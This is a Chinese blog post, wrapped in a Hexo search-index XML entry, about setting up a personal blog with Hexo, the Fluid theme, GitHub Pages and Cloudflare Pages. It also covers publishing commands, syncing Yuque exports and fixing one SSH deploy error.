    <content type="html"><![CDATA[<h1 id="工具：Cloudflare-GitHub-Hexo-Fluid"><a href="#工具：Cloudflare-GitHub-Hexo-Fluid" class="headerlink" title="工具：Cloudflare+GitHub+Hexo Fluid"></a>工具：Cloudflare+GitHub+Hexo Fluid</h1><h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>hexo 是一个快速、简洁，而且功能强大的静态博客框架。我们可以使用 Markdown 编写博客文章，然后 hexo 帮我们把 Markdown 文件渲染成静态 HTML 页面。因此 hexo 非常适合用来搭建技术类博客，以及项目文档和个人网站。</p><p>需要安装node.js依赖</p><h2 id="github托管"><a href="#github托管" class="headerlink" title="github托管"></a>github托管</h2><p>将博客项目托管到github仓库，并使用Github pages来部署博客，可以让其他人也访问该博客。</p><h2 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h2><p>使用cloudflare加速国内用户访问速度。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>dash.cloudflare.com<span class="hljs-regexp">/062413ad293e022e2f66f461b1a256f6/</span>pages<span class="hljs-regexp">/view/</span>jimi-lab-github-io<br></code></pre></td></tr></table></figure><h2 id="修改Hexo主题"><a href="#修改Hexo主题" class="headerlink" title="修改Hexo主题"></a>修改Hexo主题</h2><p>我选择Fluid主题，再加一些个性化的设计，大家可以自行选择。</p><h2 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h2><p>使用github utterances插件</p><h2 id="md中添加截图"><a href="#md中添加截图" class="headerlink" title="md中添加截图"></a>md中添加截图</h2><p>cursor中使用了Paste Image插件。<br>F1截图之后，Ctrl+Alt+V,直接粘贴到特定目录，并在当前md文档中引用该图片。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="发布新文章"><a href="#发布新文章" class="headerlink" title="发布新文章"></a>发布新文章</h2><p>1.在Hexo项目根目录下使用命令：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;Hello World&quot;</span><br></code></pre></td></tr></table></figure><p>使用该命令会在文件中自动生成文件头。<br>2.这样会在 source&#x2F;_posts&#x2F; 目录下自动生成一个 Hello-World.md 的新文章文件。你只需要编辑这个 Markdown 文件，写入你的内容即可。</p><h4 id="将语雀文档同步到个人博客："><a href="#将语雀文档同步到个人博客：" class="headerlink" title="将语雀文档同步到个人博客："></a>将语雀文档同步到个人博客：</h4><p>1.将语雀文章以md格式导出。<br>2.将导出的文件复制粘贴进Hello-World.md文件（直接将导出的文件拖入source&#x2F;_posts&#x2F; 目录也可以）<br>3.运行：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">R:\MyProject\MyBlog\my-blog&gt;<span class="hljs-keyword">python</span> yuque.<span class="hljs-keyword">py</span> Hello-World.md<br></code></pre></td></tr></table></figure><p>（这条命令会将Hello-World.md中的cdn链接转储到本地source&#x2F;img&#x2F;Hello-World目录下并在Hello-World.md更改引用本地图片）</p><p>运行以下命令可在本地查看编辑效果。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>3.完成内容创作之后，运行：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo clean &amp;&amp; hexo <span class="hljs-keyword">generate</span> &amp;&amp; hexo deploy<br></code></pre></td></tr></table></figure><p>该命令会将本地的仓库的内容同步到GitHub。</p><hr><p>最终URL：<br>github：<a href="https://jimi-lab.github.io/">https://jimi-lab.github.io/</a><br>cloudflare：<a href="https://jimi-lab-github-io.pages.dev/">https://jimi-lab-github-io.pages.dev/</a></p><p>最终效果图如下：<br><img src = "/img/搭建个人博客/background.png"></p><p><strong>报错信息汇总</strong>：</p><p>1.如果遇到以下错误：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Please make sure you have the correct access rights<br>and the repository exists.<br>FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html<br><span class="hljs-keyword">Error: </span>Spawn failed<br>    at ChildProcess.&lt;anonymous&gt; (R:\MyProject\MyBlog\my-blog\node_modules\hexo-deployer-git\node_modules\hexo-util\lib\spawn.js:51:21)<br>    at ChildProcess.emit (node:events:524:28)<br>    at cp.emit (R:\MyProject\MyBlog\my-blog\node_modules\cross-spawn\lib\enoent.js:34:29)<br>    at ChildProcess._handle.onexit (node:internal/child_process:293:12)<br></code></pre></td></tr></table></figure><p>可能是因为ssh连接github时候连接不上报错，可以尝试打开代理&#x2F;电脑使用自己手机热点&#x2F;等方法解决。</p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
